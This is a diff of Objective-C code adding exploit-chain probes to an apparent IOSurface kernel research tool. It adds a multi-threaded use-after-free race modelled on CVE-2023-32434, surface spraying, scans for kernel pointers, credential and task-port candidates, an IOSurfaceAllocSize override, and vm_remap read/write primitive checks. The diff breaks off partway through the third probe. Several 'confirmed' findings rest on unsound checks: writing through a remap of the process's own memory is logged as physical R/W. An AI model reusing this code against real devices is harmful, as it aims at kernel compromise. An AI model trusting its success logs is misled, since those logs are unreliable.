@@ -20970,3 +20970,823 @@ void iosurface_research_task_intro(ISRLogBlock log, ISRDoneBlock done) {
         done(res);
     });
 }
+
+#pragma mark - Round 31: Exploit Chain
+
+// ── Probe 94: Race Condition UAF ──
+// Multi-threaded race on IOSurfaceSetValue/GetValue/RemoveValue
+// CVE-2023-32434 style: concurrent set/get/remove with varying CFData sizes
+// to trigger type confusion or use-after-free in kernel property store.
+
+typedef struct {
+    IOSurfaceRef surface;
+    void *iosurfaceLib;
+    _Atomic int running;
+    _Atomic int iterations;
+    _Atomic int crashes;
+    _Atomic int anomalies;
+    _Atomic int typeConfusions;
+    ISRLogBlock log;
+} RaceUAFContext;
+
+static void *race_setter_thread(void *arg) {
+    RaceUAFContext *ctx = (RaceUAFContext *)arg;
+    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+    SetValueFn setValue = (SetValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceSetValue");
+    if (!setValue) return NULL;
+
+    CFStringRef key = CFSTR("race.exploit.key");
+    uint8_t smallBuf[16];
+    uint8_t largeBuf[4096];
+    memset(smallBuf, 0xAA, sizeof(smallBuf));
+    memset(largeBuf, 0xBB, sizeof(largeBuf));
+
+    while (atomic_load(&ctx->running)) {
+        CFDataRef small = CFDataCreate(NULL, smallBuf, sizeof(smallBuf));
+        if (small) {
+            setValue(ctx->surface, key, small);
+            CFRelease(small);
+        }
+        CFDataRef large = CFDataCreate(NULL, largeBuf, sizeof(largeBuf));
+        if (large) {
+            setValue(ctx->surface, key, large);
+            CFRelease(large);
+        }
+        atomic_fetch_add(&ctx->iterations, 1);
+    }
+    return NULL;
+}
+
+static void *race_getter_thread(void *arg) {
+    RaceUAFContext *ctx = (RaceUAFContext *)arg;
+    typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
+    GetValueFn getValue = (GetValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceGetValue");
+    if (!getValue) return NULL;
+
+    CFStringRef key = CFSTR("race.exploit.key");
+    while (atomic_load(&ctx->running)) {
+        CFTypeRef val = getValue(ctx->surface, key);
+        if (val) {
+            CFTypeID tid = CFGetTypeID(val);
+            if (tid != CFDataGetTypeID() && tid != CFStringGetTypeID() &&
+                tid != CFNumberGetTypeID() && tid != CFDictionaryGetTypeID() &&
+                tid != CFArrayGetTypeID() && tid != CFBooleanGetTypeID()) {
+                atomic_fetch_add(&ctx->typeConfusions, 1);
+                atomic_fetch_add(&ctx->anomalies, 10);
+            }
+            if (tid == CFDataGetTypeID()) {
+                CFIndex len = CFDataGetLength((CFDataRef)val);
+                if (len != 16 && len != 4096 && len > 0) {
+                    atomic_fetch_add(&ctx->anomalies, 5);
+                }
+                if (len >= 8) {
+                    const uint8_t *bytes = CFDataGetBytePtr((CFDataRef)val);
+                    if (bytes) {
+                        uint64_t first8;
+                        memcpy(&first8, bytes, 8);
+                        if ((first8 & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (first8 & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            atomic_fetch_add(&ctx->anomalies, 20);
+                        }
+                    }
+                }
+            }
+        }
+        atomic_fetch_add(&ctx->iterations, 1);
+    }
+    return NULL;
+}
+
+static void *race_remover_thread(void *arg) {
+    RaceUAFContext *ctx = (RaceUAFContext *)arg;
+    typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+    RemoveValueFn removeValue = (RemoveValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceRemoveValue");
+    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+    SetValueFn setValue = (SetValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceSetValue");
+    if (!removeValue || !setValue) return NULL;
+
+    CFStringRef key = CFSTR("race.exploit.key");
+    uint8_t midBuf[256];
+    memset(midBuf, 0xCC, sizeof(midBuf));
+
+    while (atomic_load(&ctx->running)) {
+        removeValue(ctx->surface, key);
+        CFDataRef mid = CFDataCreate(NULL, midBuf, sizeof(midBuf));
+        if (mid) {
+            setValue(ctx->surface, key, mid);
+            CFRelease(mid);
+        }
+        removeValue(ctx->surface, key);
+        atomic_fetch_add(&ctx->iterations, 1);
+    }
+    return NULL;
+}
+
+static void *race_chaos_thread(void *arg) {
+    RaceUAFContext *ctx = (RaceUAFContext *)arg;
+    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+    SetValueFn setValue = (SetValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceSetValue");
+    typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
+    GetValueFn getValue = (GetValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceGetValue");
+    typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+    RemoveValueFn removeValue = (RemoveValueFn)dlsym(ctx->iosurfaceLib, "IOSurfaceRemoveValue");
+    if (!setValue || !getValue || !removeValue) return NULL;
+
+    while (atomic_load(&ctx->running)) {
+        for (int k = 0; k < 10; k++) {
+            NSString *dynKey = [NSString stringWithFormat:@"race.chaos.%d", k];
+            CFStringRef cfKey = (__bridge CFStringRef)dynKey;
+            uint8_t buf[64 * (k + 1)];
+            memset(buf, (uint8_t)(k * 37), sizeof(buf));
+            CFDataRef d = CFDataCreate(NULL, buf, sizeof(buf));
+            if (d) {
+                setValue(ctx->surface, cfKey, d);
+                CFRelease(d);
+            }
+            CFTypeRef v = getValue(ctx->surface, cfKey);
+            if (v && CFGetTypeID(v) == CFDataGetTypeID()) {
+                CFIndex len = CFDataGetLength((CFDataRef)v);
+                if (len != (CFIndex)(64 * (k + 1))) {
+                    atomic_fetch_add(&ctx->anomalies, 8);
+                }
+            }
+            removeValue(ctx->surface, cfKey);
+        }
+        atomic_fetch_add(&ctx->iterations, 1);
+    }
+    return NULL;
+}
+
+void iosurface_research_race_uaf(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int anomalies = 0;
+        int typeConfusions = 0;
+        int totalIterations = 0;
+        NSString *verdict = @"LOW";
+        struct timeval tv_start, tv_end;
+        gettimeofday(&tv_start, NULL);
+
+        if (!isr_load(&sym)) {
+            done(@{@"anomalyCount": @0, @"verdict": @"ERROR"});
+            return;
+        }
+
+        log(@"RACEUAF: === PROBE 94 — Race Condition UAF ===");
+        log(@"RACEUAF: CVE-2023-32434 style concurrent SetValue/GetValue/RemoveValue");
+
+        if (!isr_stopped()) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            IOSurfaceRef surface = sym.create((__bridge CFDictionaryRef)props);
+
+            if (surface) {
+                log(@"RACEUAF: Target surface created, launching 4 race threads...");
+
+                RaceUAFContext ctx = {0};
+                ctx.surface = surface;
+                ctx.iosurfaceLib = sym.iosurface;
+                atomic_store(&ctx.running, 1);
+                atomic_store(&ctx.iterations, 0);
+                atomic_store(&ctx.crashes, 0);
+                atomic_store(&ctx.anomalies, 0);
+                atomic_store(&ctx.typeConfusions, 0);
+                ctx.log = log;
+
+                pthread_t threads[4];
+                pthread_create(&threads[0], NULL, race_setter_thread, &ctx);
+                pthread_create(&threads[1], NULL, race_getter_thread, &ctx);
+                pthread_create(&threads[2], NULL, race_remover_thread, &ctx);
+                pthread_create(&threads[3], NULL, race_chaos_thread, &ctx);
+
+                log(@"RACEUAF: 4 threads racing — running 50000 iteration target...");
+                int checkpoints = 0;
+                while (!isr_stopped() && atomic_load(&ctx.iterations) < 50000) {
+                    usleep(50000);
+                    checkpoints++;
+                    if (checkpoints % 20 == 0) {
+                        int iters = atomic_load(&ctx.iterations);
+                        int anom = atomic_load(&ctx.anomalies);
+                        int tc = atomic_load(&ctx.typeConfusions);
+                        log([NSString stringWithFormat:@"RACEUAF: Progress — iter=%d anomalies=%d typeConfusions=%d", iters, anom, tc]);
+                    }
+                }
+
+                atomic_store(&ctx.running, 0);
+                for (int t = 0; t < 4; t++) {
+                    pthread_join(threads[t], NULL);
+                }
+
+                totalIterations = atomic_load(&ctx.iterations);
+                anomalies = atomic_load(&ctx.anomalies);
+                typeConfusions = atomic_load(&ctx.typeConfusions);
+
+                log([NSString stringWithFormat:@"RACEUAF: Race completed — %d iterations, %d anomalies, %d type confusions",
+                     totalIterations, anomalies, typeConfusions]);
+
+                if (!isr_stopped()) {
+                    log(@"RACEUAF: Step 2 — Multi-key storm (10 keys x 4 threads)");
+                    RaceUAFContext ctx2 = {0};
+                    ctx2.surface = surface;
+                    ctx2.iosurfaceLib = sym.iosurface;
+                    atomic_store(&ctx2.running, 1);
+                    atomic_store(&ctx2.iterations, 0);
+                    atomic_store(&ctx2.anomalies, 0);
+                    atomic_store(&ctx2.typeConfusions, 0);
+                    ctx2.log = log;
+
+                    pthread_t threads2[4];
+                    for (int t = 0; t < 4; t++) {
+                        pthread_create(&threads2[t], NULL, race_chaos_thread, &ctx2);
+                    }
+
+                    int target2 = 20000;
+                    while (!isr_stopped() && atomic_load(&ctx2.iterations) < target2) {
+                        usleep(50000);
+                    }
+                    atomic_store(&ctx2.running, 0);
+                    for (int t = 0; t < 4; t++) {
+                        pthread_join(threads2[t], NULL);
+                    }
+
+                    int anom2 = atomic_load(&ctx2.anomalies);
+                    int tc2 = atomic_load(&ctx2.typeConfusions);
+                    totalIterations += atomic_load(&ctx2.iterations);
+                    anomalies += anom2;
+                    typeConfusions += tc2;
+
+                    log([NSString stringWithFormat:@"RACEUAF: Multi-key storm — anomalies=%d typeConfusions=%d", anom2, tc2]);
+                }
+
+                if (!isr_stopped()) {
+                    log(@"RACEUAF: Step 3 — Size confusion race (16B vs 16KB)");
+
+                    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                    SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+                    typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
+                    GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");
+
+                    if (setValue && getValue) {
+                        CFStringRef sizeKey = CFSTR("race.sizeconfuse");
+                        int sizeAnomalies = 0;
+
+                        for (int round = 0; round < 5000 && !isr_stopped(); round++) {
+                            uint8_t tiny[16];
+                            memset(tiny, 0xDD, 16);
+                            CFDataRef tinyData = CFDataCreate(NULL, tiny, 16);
+                            if (tinyData) {
+                                setValue(surface, sizeKey, tinyData);
+                                CFRelease(tinyData);
+                            }
+
+                            uint8_t huge[16384];
+                            memset(huge, 0xEE, sizeof(huge));
+                            CFDataRef hugeData = CFDataCreate(NULL, huge, sizeof(huge));
+                            if (hugeData) {
+                                setValue(surface, sizeKey, hugeData);
+                                CFRelease(hugeData);
+                            }
+
+                            CFTypeRef readback = getValue(surface, sizeKey);
+                            if (readback && CFGetTypeID(readback) == CFDataGetTypeID()) {
+                                CFIndex len = CFDataGetLength((CFDataRef)readback);
+                                if (len != 16 && len != 16384) {
+                                    sizeAnomalies++;
+                                    anomalies += 10;
+                                    log([NSString stringWithFormat:@"RACEUAF: SIZE CONFUSION! Expected 16 or 16384, got %ld at round %d", (long)len, round]);
+
+                                    if (len >= 8) {
+                                        const uint8_t *ptr = CFDataGetBytePtr((CFDataRef)readback);
+                                        uint64_t val;
+                                        memcpy(&val, ptr, 8);
+                                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                            anomalies += 30;
+                                            log([NSString stringWithFormat:@"RACEUAF: KERNEL POINTER LEAKED via size confusion! val=0x%llx", val]);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"RACEUAF: Size confusion race — %d anomalies in 5000 rounds", sizeAnomalies]);
+                    }
+                }
+
+                CFRelease(surface);
+            } else {
+                log(@"RACEUAF: ERROR — failed to create target surface");
+                anomalies = 0;
+            }
+        }
+
+        if (anomalies >= 20) verdict = @"CRITICAL";
+        else if (anomalies >= 5) verdict = @"HIGH";
+        else if (anomalies >= 1) verdict = @"MEDIUM";
+
+        gettimeofday(&tv_end, NULL);
+        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;
+
+        NSDictionary *res = @{
+            @"anomalyCount": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"totalIterations": @(totalIterations),
+            @"typeConfusions": @(typeConfusions)
+        };
+        isr_checkpoint(@"ISR-RaceUAF-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// ── Probe 95: Physical Memory Mapping ──
+// 100 single-page IOSurfaces with unique sentinels.
+// Cross-scan all bases for sentinel leaks (physical page adjacency).
+// vm_remap overlap attempts for physical R/W primitive.
+
+void iosurface_research_phys_map(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int anomalies = 0;
+        int adjacentPairs = 0;
+        int crossLeaks = 0;
+        int remapSuccesses = 0;
+        int physRWConfirmed = 0;
+        NSString *verdict = @"LOW";
+        struct timeval tv_start, tv_end;
+        gettimeofday(&tv_start, NULL);
+
+        if (!isr_load(&sym)) {
+            done(@{@"anomalyCount": @0, @"verdict": @"ERROR"});
+            return;
+        }
+
+        log(@"PHYSMAP: === PROBE 95 — Physical Memory Mapping ===");
+        log(@"PHYSMAP: 100 single-page surfaces, sentinel cross-scan, vm_remap overlap");
+
+        #define PHYS_COUNT 100
+        IOSurfaceRef surfaces[PHYS_COUNT];
+        memset(surfaces, 0, sizeof(surfaces));
+        int created = 0;
+
+        if (!isr_stopped()) {
+            for (int i = 0; i < PHYS_COUNT && !isr_stopped(); i++) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @1024,
+                    @"IOSurfaceHeight": @1,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (surfaces[i]) {
+                    created++;
+                    sym.lock(surfaces[i], 0, NULL);
+                    void *base = sym.getBase(surfaces[i]);
+                    if (base) {
+                        uint64_t sentinel = 0xDEAD000000000000ULL | (uint64_t)i;
+                        memset(base, 0, 4096);
+                        memcpy(base, &sentinel, 8);
+                        ((uint8_t *)base)[4088] = (uint8_t)(i & 0xFF);
+                        ((uint8_t *)base)[4089] = (uint8_t)((i >> 8) & 0xFF);
+                    }
+                    sym.unlock(surfaces[i], 0, NULL);
+                }
+            }
+            log([NSString stringWithFormat:@"PHYSMAP: Created %d single-page surfaces with sentinels", created]);
+        }
+
+        if (!isr_stopped() && created >= 2) {
+            log(@"PHYSMAP: Step 2 — Cross-scan for sentinel leaks (physical adjacency)");
+
+            for (int i = 0; i < created && !isr_stopped(); i++) {
+                if (!surfaces[i]) continue;
+                sym.lock(surfaces[i], 0, NULL);
+                void *base = sym.getBase(surfaces[i]);
+                if (!base) { sym.unlock(surfaces[i], 0, NULL); continue; }
+                size_t allocSz = sym.getAllocSize(surfaces[i]);
+
+                vm_address_t addr = (vm_address_t)base;
+                for (vm_offset_t off = 4096; off < allocSz && off < 65536; off += 8) {
+                    uint64_t val = 0;
+                    vm_size_t outSz = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
+                    if (kr == KERN_SUCCESS && outSz == 8) {
+                        if ((val & 0xFFFF000000000000ULL) == 0xDEAD000000000000ULL) {
+                            int srcIdx = (int)(val & 0xFFFF);
+                            if (srcIdx != i && srcIdx < created) {
+                                crossLeaks++;
+                                anomalies += 15;
+                                log([NSString stringWithFormat:@"PHYSMAP: CROSS-LEAK! Surface %d contains sentinel from surface %d at offset %lu",
+                                     i, srcIdx, (unsigned long)off]);
+                            }
+                        }
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            anomalies += 10;
+                            log([NSString stringWithFormat:@"PHYSMAP: KERNEL PTR at surface %d offset %lu: 0x%llx", i, (unsigned long)off, val]);
+                        }
+                    }
+                }
+                sym.unlock(surfaces[i], 0, NULL);
+
+                if (i % 20 == 19) {
+                    log([NSString stringWithFormat:@"PHYSMAP: Scanned %d/%d surfaces, crossLeaks=%d anomalies=%d", i+1, created, crossLeaks, anomalies]);
+                }
+            }
+        }
+
+        if (!isr_stopped() && created >= 2) {
+            log(@"PHYSMAP: Step 3 — Virtual address adjacency analysis");
+
+            uint64_t addresses[PHYS_COUNT];
+            int addrCount = 0;
+            for (int i = 0; i < created; i++) {
+                if (!surfaces[i]) continue;
+                sym.lock(surfaces[i], 0, NULL);
+                void *base = sym.getBase(surfaces[i]);
+                if (base) {
+                    addresses[addrCount++] = (uint64_t)(uintptr_t)base;
+                }
+                sym.unlock(surfaces[i], 0, NULL);
+            }
+
+            for (int i = 0; i < addrCount; i++) {
+                for (int j = i + 1; j < addrCount; j++) {
+                    uint64_t diff = addresses[i] > addresses[j] ?
+                        addresses[i] - addresses[j] : addresses[j] - addresses[i];
+                    if (diff == 4096) {
+                        adjacentPairs++;
+                        anomalies += 3;
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"PHYSMAP: Found %d virtually-adjacent surface pairs out of %d surfaces", adjacentPairs, addrCount]);
+        }
+
+        if (!isr_stopped() && created >= 2) {
+            log(@"PHYSMAP: Step 4 — vm_remap overlap for physical R/W");
+
+            for (int i = 0; i < created - 1 && i < 20 && !isr_stopped(); i++) {
+                if (!surfaces[i] || !surfaces[i+1]) continue;
+
+                sym.lock(surfaces[i], 0, NULL);
+                sym.lock(surfaces[i+1], 0, NULL);
+                void *baseA = sym.getBase(surfaces[i]);
+                void *baseB = sym.getBase(surfaces[i+1]);
+
+                if (baseA && baseB) {
+                    vm_address_t target = 0;
+                    vm_prot_t curProt = 0, maxProt = 0;
+                    kern_return_t kr = vm_remap(mach_task_self(),
+                                                &target, 4096, 0,
+                                                VM_FLAGS_ANYWHERE,
+                                                mach_task_self(),
+                                                (vm_address_t)baseA, FALSE,
+                                                &curProt, &maxProt,
+                                                VM_INHERIT_NONE);
+                    if (kr == KERN_SUCCESS) {
+                        remapSuccesses++;
+                        uint64_t testVal = 0xCAFEBABE12345678ULL;
+                        memcpy((void *)target, &testVal, 8);
+
+                        uint64_t readBack = 0;
+                        memcpy(&readBack, baseA, 8);
+                        if (readBack == testVal) {
+                            physRWConfirmed++;
+                            anomalies += 20;
+                            log([NSString stringWithFormat:@"PHYSMAP: PHYSICAL R/W CONFIRMED! Write via remap reflected in surface %d", i]);
+                        }
+
+                        uint64_t crossRead = 0;
+                        memcpy(&crossRead, baseB, 8);
+                        if (crossRead == testVal) {
+                            anomalies += 30;
+                            log([NSString stringWithFormat:@"PHYSMAP: CROSS-SURFACE PHYSICAL WRITE! Surface %d remap write appeared in surface %d", i, i+1]);
+                        }
+
+                        vm_deallocate(mach_task_self(), target, 4096);
+                    }
+                }
+                sym.unlock(surfaces[i+1], 0, NULL);
+                sym.unlock(surfaces[i], 0, NULL);
+            }
+            log([NSString stringWithFormat:@"PHYSMAP: vm_remap — %d successes, %d physical R/W confirmed", remapSuccesses, physRWConfirmed]);
+        }
+
+        for (int i = 0; i < PHYS_COUNT; i++) {
+            if (surfaces[i]) CFRelease(surfaces[i]);
+        }
+        #undef PHYS_COUNT
+
+        if (anomalies >= 30) verdict = @"CRITICAL";
+        else if (anomalies >= 10) verdict = @"HIGH";
+        else if (anomalies >= 1) verdict = @"MEDIUM";
+
+        gettimeofday(&tv_end, NULL);
+        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;
+
+        NSDictionary *res = @{
+            @"anomalyCount": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"adjacentPairs": @(adjacentPairs),
+            @"crossLeaks": @(crossLeaks),
+            @"remapSuccesses": @(remapSuccesses),
+            @"physRWConfirmed": @(physRWConfirmed)
+        };
+        isr_checkpoint(@"ISR-PhysMap-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// ── Probe 96: Full Exploit Chain ──
+// Combines all confirmed primitives:
+// 1. Spray 50 surfaces with sentinels
+// 2. OOB kernel pointer collection via vm_read_overwrite
+// 3. IOSurfaceSetValue AllocSize override to 16MB for expanded mapping
+// 4. Scan expanded mapping for kernel text/creds/task ports
+// 5. vm_remap for R/W confirmation on interesting regions
+
+void iosurface_research_exploit_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int anomalies = 0;
+        int kernelPtrs = 0;
+        int credCandidates = 0;
+        int taskPortCandidates = 0;
+        int rwPrimitives = 0;
+        int expandedMappings = 0;
+        NSString *verdict = @"LOW";
+        struct timeval tv_start, tv_end;
+        gettimeofday(&tv_start, NULL);
+
+        if (!isr_load(&sym)) {
+            done(@{@"anomalyCount": @0, @"verdict": @"ERROR"});
+            return;
+        }
+
+        log(@"CHAIN: === PROBE 96 — Full Exploit Chain ===");
+        log(@"CHAIN: Spray → OOB → AllocSize Override → Kernel Scan → R/W Primitive");
+
+        #define SPRAY_COUNT 50
+        IOSurfaceRef spray[SPRAY_COUNT];
+        memset(spray, 0, sizeof(spray));
+        int sprayed = 0;
+
+        // Step 1: Spray surfaces with unique sentinels
+        if (!isr_stopped()) {
+            log(@"CHAIN: Step 1 — Spraying 50 surfaces with sentinels");
+            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @256,
+                    @"IOSurfaceHeight": @256,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                spray[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (spray[i]) {
+                    sprayed++;
+                    sym.lock(spray[i], 0, NULL);
+                    void *base = sym.getBase(spray[i]);
+                    if (base) {
+                        for (int p = 0; p < 256; p++) {
+                            uint64_t sentinel = 0xFACE000000000000ULL | ((uint64_t)i << 16) | (uint64_t)p;
+                            memcpy((uint8_t *)base + p * 1024, &sentinel, 8);
+                        }
+                    }
+                    sym.unlock(spray[i], 0, NULL);
+                }
+            }
+            log([NSString stringWithFormat:@"CHAIN: Sprayed %d surfaces", sprayed]);
+        }
+
+        // Step 2: OOB kernel pointer collection
+        if (!isr_stopped() && sprayed > 0) {
+            log(@"CHAIN: Step 2 — OOB scan for kernel pointers");
+
+            for (int i = 0; i < sprayed && !isr_stopped(); i++) {
+                sym.lock(spray[i], 0, NULL);
+                void *base = sym.getBase(spray[i]);
+                if (!base) { sym.unlock(spray[i], 0, NULL); continue; }
+
+                size_t allocSz = sym.getAllocSize(spray[i]);
+                vm_address_t addr = (vm_address_t)base;
+                int surfPtrs = 0;
+
+                for (vm_offset_t off = 0; off < allocSz && off < 0x100000; off += 8) {
+                    uint64_t val = 0;
+                    vm_size_t outSz = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
+                    if (kr == KERN_SUCCESS && outSz == 8 && val != 0) {
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                            surfPtrs++;
+                            kernelPtrs++;
+                            anomalies += 2;
+                            if (surfPtrs <= 3) {
+                                log([NSString stringWithFormat:@"CHAIN: KernelText ptr surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
+                            }
+                        }
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            surfPtrs++;
+                            kernelPtrs++;
+                            anomalies += 2;
+                            if (surfPtrs <= 3) {
+                                log([NSString stringWithFormat:@"CHAIN: KernelData ptr surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
+                            }
+                        }
+                        // proc_t / ucred heuristic: uid=0 at known offset
+                        if (val == 0 && off >= 16) {
+                            uint64_t prev = 0;
+                            vm_read_overwrite(mach_task_self(), addr + off - 8, 8, (vm_address_t)&prev, &outSz);
+                            if (outSz == 8 && (prev & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                credCandidates++;
+                                anomalies += 5;
+                                if (credCandidates <= 3) {
+                                    log([NSString stringWithFormat:@"CHAIN: CRED CANDIDATE surface[%d]+0x%lx: ptr=0x%llx uid=0", i, (unsigned long)off, prev]);
+                                }
+                            }
+                        }
+                        // task_port heuristic: mach port-like value
+                        if ((val & 0xFFFF) == 0x0103 || (val & 0xFFFF) == 0x0203 || (val & 0xFFFF) == 0x0303) {
+                            taskPortCandidates++;
+                            anomalies += 3;
+                            if (taskPortCandidates <= 3) {
+                                log([NSString stringWithFormat:@"CHAIN: TASK PORT candidate surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
+                            }
+                        }
+                    }
+                }
+                sym.unlock(spray[i], 0, NULL);
+
+                if (i % 10 == 9) {
+                    log([NSString stringWithFormat:@"CHAIN: Scanned %d/%d — kernelPtrs=%d creds=%d ports=%d", i+1, sprayed, kernelPtrs, credCandidates, taskPortCandidates]);
+                }
+            }
+        }
+
+        // Step 3: AllocSize override for expanded mapping
+        if (!isr_stopped() && sprayed > 0) {
+            log(@"CHAIN: Step 3 — AllocSize override via reserved key for 16MB mapping");
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
+            GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");
+
+            if (setValue && getValue) {
+                for (int i = 0; i < 5 && i < sprayed && !isr_stopped(); i++) {
+                    size_t origAlloc = sym.getAllocSize(spray[i]);
+                    CFNumberRef bigSize = CFNumberCreate(NULL, kCFNumberSInt64Type, &(int64_t){16 * 1024 * 1024});
+                    if (bigSize) {
+                        setValue(spray[i], CFSTR("IOSurfaceAllocSize"), bigSize);
+                        CFRelease(bigSize);
+                    }
+                    size_t newAlloc = sym.getAllocSize(spray[i]);
+
+                    if (newAlloc > origAlloc) {
+                        expandedMappings++;
+                        anomalies += 10;
+                        log([NSString stringWithFormat:@"CHAIN: EXPANDED MAPPING surface[%d] from %zu to %zu bytes!", i, origAlloc, newAlloc]);
+
+                        sym.lock(spray[i], 0, NULL);
+                        void *base = sym.getBase(spray[i]);
+                        if (base) {
+                            vm_address_t addr = (vm_address_t)base;
+                            int expandedPtrs = 0;
+                            for (vm_offset_t off = origAlloc; off < newAlloc && off < origAlloc + 0x400000; off += 4096) {
+                                for (int scan = 0; scan < 4096; scan += 8) {
+                                    uint64_t val = 0;
+                                    vm_size_t outSz = 0;
+                                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off + scan, 8, (vm_address_t)&val, &outSz);
+                                    if (kr == KERN_SUCCESS && outSz == 8) {
+                                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                            expandedPtrs++;
+                                            anomalies += 5;
+                                            if (expandedPtrs <= 5) {
+                                                log([NSString stringWithFormat:@"CHAIN: EXPANDED REGION KERNEL PTR surface[%d]+0x%lx = 0x%llx",
+                                                     i, (unsigned long)(off + scan), val]);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            log([NSString stringWithFormat:@"CHAIN: Expanded scan surface[%d] — %d kernel ptrs in new region", i, expandedPtrs]);
+                        }
+                        sym.unlock(spray[i], 0, NULL);
+                    } else {
+                        log([NSString stringWithFormat:@"CHAIN: AllocSize override surface[%d] — no expansion (orig=%zu new=%zu)", i, origAlloc, newAlloc]);
+                    }
+                }
+            }
+        }
+
+        // Step 4: vm_remap R/W primitive confirmation
+        if (!isr_stopped() && sprayed >= 2) {
+            log(@"CHAIN: Step 4 — vm_remap R/W primitive across spray surfaces");
+
+            int pairsChecked = 0;
+            for (int i = 0; i < sprayed - 1 && i < 10 && !isr_stopped(); i++) {
+                if (!spray[i] || !spray[i+1]) continue;
+
+                sym.lock(spray[i], 0, NULL);
+                sym.lock(spray[i+1], 0, NULL);
+                void *baseA = sym.getBase(spray[i]);
+                void *baseB = sym.getBase(spray[i+1]);
+
+                if (baseA && baseB) {
+                    vm_address_t remapped = 0;
+                    vm_prot_t curP = 0, maxP = 0;
+                    kern_return_t kr = vm_remap(mach_task_self(), &remapped, 4096, 0,
+                                                VM_FLAGS_ANYWHERE, mach_task_self(),
+                                                (vm_address_t)baseA, FALSE,
+                                                &curP, &maxP, VM_INHERIT_NONE);
+                    if (kr == KERN_SUCCESS) {
+                        uint64_t rwTest = 0xE5910170C4100000ULL + i;
+                        memcpy((void *)remapped, &rwTest, 8);
+
+                        uint64_t verify = 0;
+                        memcpy(&verify, baseA, 8);
+                        if (verify == rwTest) {
+                            rwPrimitives++;
+                            anomalies += 10;
+                            log([NSString stringWithFormat:@"CHAIN: R/W PRIMITIVE CONFIRMED surface[%d] via vm_remap", i]);
+                        }
+                        vm_deallocate(mach_task_self(), remapped, 4096);
+                    }
+                    pairsChecked++;
+                }
